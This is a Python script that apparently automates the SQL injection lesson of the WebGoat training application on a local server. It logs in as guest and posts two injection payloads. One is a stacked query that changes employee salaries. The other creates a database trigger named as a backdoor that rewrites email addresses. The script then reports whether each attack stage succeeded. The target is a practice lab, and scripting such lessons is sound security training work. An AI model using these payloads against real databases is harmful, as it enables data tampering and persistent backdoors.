import requests
import unicodedata

url1 = "http://127.0.0.1:8080/WebGoat/login.mvc"
url2 = "http://127.0.0.1:8080/WebGoat/j_spring_security_check"
url3 = "http://127.0.0.1:8080/WebGoat/service/lessonmenu.mvc"
loginInfo = {'username':'guest','password':'guest'}
stage1success = "succeeded"
stage2success = "successfully"

session = requests.Session()
start = session.get(url1)
login = session.post(url2,data=loginInfo)

#Parse lesson menu
lessonMenu = session.get(url3)
menuJson = lessonMenu.json()
vulnLinkSectUnicode = menuJson[10]["children"][8]["link"]
vulnLinkSect = unicodedata.normalize("NFKD", vulnLinkSectUnicode).encode("ascii","ignore")

#Request the lesson
fullVulnLink = "http://127.0.0.1:8080/WebGoat/" + vulnLinkSect
page = session.get(fullVulnLink)

#Reset lesson | Do this to clear previous lessons
page = session.get("http://127.0.0.1:8080/WebGoat/service/restartlesson.mvc")

#Complete stage 1
stage1Payload = {"username":"101 or 1=1; update employee set salary=100000"}
page = session.post(fullVulnLink,data=stage1Payload)
stage1_status = page.text.find(stage1success)

#Complete stage 2
stage2Payload = {"username":"101; CREATE TRIGGER myBackDoor BEFORE INSERT ON employee FOR EACH ROW BEGIN UPDATE employee SET email='john@hackme.com' WHERE userid = NEW.userid"}
page = session.post(fullVulnLink,data=stage2Payload)
stage2_status = page.text.find(stage2success)
if stage1_status > -1:
  print "Vuln-20 Stage 1 Attack Successful"
  if stage2_status > -1:
    print "Vuln-20 Stage 2 Attack Successful"
  else:
    print "Vuln-20 Stage 2 Attack Unsuccessful"
else:
  print "Vuln-20 Stage 1 Attack Unsuccessful"
  print "Unable to Reach Vuln-20 Stage 2 Attack"
